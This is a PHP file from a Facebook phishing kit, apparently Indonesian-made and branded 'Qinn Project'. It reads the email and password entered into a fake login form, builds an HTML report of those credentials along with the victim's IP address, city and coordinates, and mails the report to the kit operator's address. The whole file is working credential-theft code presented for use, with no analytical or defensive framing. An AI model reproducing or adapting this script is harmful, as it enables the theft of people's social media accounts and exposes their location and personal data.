<?php
// MENGAMBIL CONTROL
include 'system/UserAgent.php';
include 'system/setting.php';

// Mengambil Tahun Saat ini
$yearNow = date('Y'); // hapus aja pasti erorr

$email = $_POST['email'];
$password = $_POST['password'];
if ($email == "" && $password == "") {
    header("Location: index.php");
} else {
    $subjek = "$qinn_flag | $qinn_callingcode | LOG ( FACEBOOK ) | $email";
    $pesan = '
<center>
<div style="background: url(https://d.top4top.io/p_2197xpt7h0.png) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
<div style="background: rgba(0, 0, 0, 0.4); width: 100%; height: 100%; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
</div>
   <div style="border:2px solid #000000;border-bottom:none;width: 294; font-weight:bold; height: 20px; background: linear-gradient(to right, #F0FFFF, #FFF0F5); color: #000; padding:8px 0; text-align:center;">
 INFORMASI AKUN</div>
    <table border="1" bordercolor="#000000" width="100%" style="color:#000; border:2px solid #000000; border-collapse:collapse;background: linear-gradient(to right, #F0FFFF, #FFF0F5);">
       <tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="width: 78%; text-align: center;"><b>FACEBOOK</th> 
</tr>
</table>
   <div style="border:2px solid #000000;border-bottom:none;width: 294; font-weight:bold; height: 20px; background: linear-gradient(to right, #F0FFFF, #FFF0F5); color: #000; padding:8px 0; text-align:center;">
 INFORMASI DEVICE</div>
    <table border="1" bordercolor="#b993d6" width="100%" style="color:#000; border:2px solid #000000; border-collapse:collapse;background: linear-gradient(to right, #F0FFFF, #FFF0F5);">
       <tr>
<th style="width: 22%; text-align: left;" height="25px"><b>IP ADDRESS</th>
<th style="width: 78%; text-align: center;"><b>'.$qinn_ip_address.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CONTINENT</th>
<th style="width: 78%; text-align: center;"><b>'.$qinn_continent.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$qinn_country.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$qinn_region.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$qinn_city.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$qinn_latitude.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$qinn_longitude.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN TIME</th>
<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th>
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>TAHUN</th>
<th style="width: 78%; text-align: center;"><b>'.$yearNow.'</th> 
</tr>
</table> 
   <div style="border:2px solid #000000;border-top:none;width: 294; font-weight:bold; height: 20px; background: linear-gradient(to right, #F0FFFF, #FFF0F5); color: #000; padding: 10px 0; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">&copy; 2022 <a href="https://cloud.qinn.my.id">Qinn Project</a>
   </div>
    <center>
';
    include 'email.php';
    $headers = "MIME-Version: 1.0\r\n";
    $headers = "MIME-Version: 1.0\r\nContent-type: text/html; charset=iso-8859-1\r\n";
    $headers .= '' . $kirim . "" . "\r\n";
    mail($emailku, $subjek, $pesan, $headers);
}
?>
